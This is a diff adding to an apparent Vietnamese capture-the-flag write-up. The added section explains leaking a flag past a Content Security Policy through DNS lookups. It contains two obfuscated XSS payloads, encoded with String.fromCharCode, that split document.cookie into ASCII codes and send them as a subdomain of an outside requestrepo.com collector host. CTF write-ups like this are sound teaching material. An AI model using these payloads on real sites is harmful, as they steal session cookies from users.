@@ -114,6 +114,22 @@ Payload:
 
   Sau một lúc fuzzing để kiểm tra thì dù CSP chặn redirect nhưng `window.location.href=hackerwebsite.com` vẫn resolve dns vậy ta có thể tận dụng cái này để leak flag do flag khá dài nên mình leak 2 lần để lấy flag (ví dụ `flag.hackerwebsite.com`)
 
+  Nhưng leak kiểu gì? Mình đã thử leak kiểu `btoa(document.cookie)+".hackerwebsite.com"` nhưng khi leak thì vì lý do bảo mật dns query sẽ ngẫu nhiên uppercase hoặc lowercase các ký tự làm base64 bị lỗi nên nghĩ sang cách khác là `document.cookie.charCodeAt(0->document.cookie.length-1)` để leak ra từng ký tự của flag sang mã ascii
+
+  Đây là payload để leak 1 nữa flag (do flag khá dài nên phải leak 2 lần)
+
+  ```html
+  aa<img src=1 onerror='document.body.innerHTML=" <img src=x onerror=eval\u0028String.fromCharCode\u0028119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,34,104,116,116,112,58,47,47,34,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,46,115,117,98,115,116,114,105,110,103,40,48,44,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,46,108,101,110,103,116,104,47,50,41,46,115,112,108,105,116,40,34,34,41,46,109,97,112,40,99,61,62,99,46,99,104,97,114,67,111,100,101,65,116,40,48,41,41,46,106,111,105,110,40,34,46,34,41,43,34,46,119,117,107,122,98,55,50,122,46,114,101,113,117,101,115,116,114,101,112,111,46,99,111,109,34\u0029\u0029>";'>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+  ```
+
+  Payload thứ 2 để leak phần còn lại
+
+  ```html
+  aa<img src=1 onerror='document.body.innerHTML=" <img src=x onerror=eval\u0028String.fromCharCode\u0028119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,34,104,116,116,112,58,47,47,34,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,46,115,117,98,115,116,114,105,110,103,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,46,108,101,110,103,116,104,47,50,44,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,46,108,101,110,103,116,104,41,46,115,112,108,105,116,40,34,34,41,46,109,97,112,40,99,61,62,99,46,99,104,97,114,67,111,100,101,65,116,40,48,41,41,46,106,111,105,110,40,34,46,34,41,43,34,46,119,117,107,122,98,55,50,122,46,114,101,113,117,101,115,116,114,101,112,111,46,99,111,109,34\u0029\u0029>";'>aaaaaaaa
+  ```
+  
+  Decode mã ascii và lấy flag
+
   ![image](https://i.imgur.com/nkf2UMl.png)
 
   **Flag: W1{WASM_101_and_some_js_gadget_hope_you_enjoyed:)))))))))))))))))))))))))))))))))))))))))@0x4161}**
